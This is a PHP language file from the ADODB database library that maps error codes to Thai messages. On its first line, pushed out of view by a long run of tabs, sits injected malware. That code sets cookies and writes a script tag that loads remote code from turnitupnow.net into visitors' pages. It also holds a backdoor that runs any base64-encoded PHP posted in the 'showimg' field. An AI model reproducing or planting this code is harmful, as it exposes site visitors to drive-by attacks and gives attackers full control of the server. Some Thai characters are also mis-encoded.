<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

// by Trirat Petchsingh <rosskouk#gmail.com>
$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'th',
            DB_ERROR                    => 'error ไม่รู้สาเหตุ',
            DB_ERROR_ALREADY_EXISTS     => 'มี�?ล้ว',
            DB_ERROR_CANNOT_CREATE      => 'สร้างไม่ได้',
            DB_ERROR_CANNOT_DELETE      => 'ลบไม่ได้',
            DB_ERROR_CANNOT_DROP        => 'drop ไม่ได้',
            DB_ERROR_CONSTRAINT         => 'constraint violation',
            DB_ERROR_DIVZERO            => 'หา�?ด้วยสู�?',
            DB_ERROR_INVALID            => 'ไม่ valid',
            DB_ERROR_INVALID_DATE       => 'วันที่ เวลา ไม่ valid',
            DB_ERROR_INVALID_NUMBER     => 'เลขไม่ valid',
            DB_ERROR_MISMATCH           => 'mismatch',
            DB_ERROR_NODBSELECTED       => 'ไม่ได้เลือ�?�?านข้อมูล',
            DB_ERROR_NOSUCHFIELD        => 'ไม่มีฟีลด์นี้',
            DB_ERROR_NOSUCHTABLE        => 'ไม่มีตารางนี้',
            DB_ERROR_NOT_CAPABLE        => 'DB backend not capable',
            DB_ERROR_NOT_FOUND          => 'ไม่พบ',
            DB_ERROR_NOT_LOCKED         => 'ไม่ได้ล๊อ�?',
            DB_ERROR_SYNTAX             => 'ผิด syntax',
            DB_ERROR_UNSUPPORTED        => 'ไม่ support',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'value count on row',
            DB_ERROR_INVALID_DSN        => 'invalid DSN',
            DB_ERROR_CONNECT_FAILED     => 'ไม่สามารถ connect',
            0	                        => 'no error', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'ข้อมูลไม่เพียงพอ',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'ไม่พบ extension',
            DB_ERROR_NOSUCHDB           => 'ไม่มีข้อมูลนี้',
            DB_ERROR_ACCESS_VIOLATION   => 'permissions ไม่พอ'
);
?>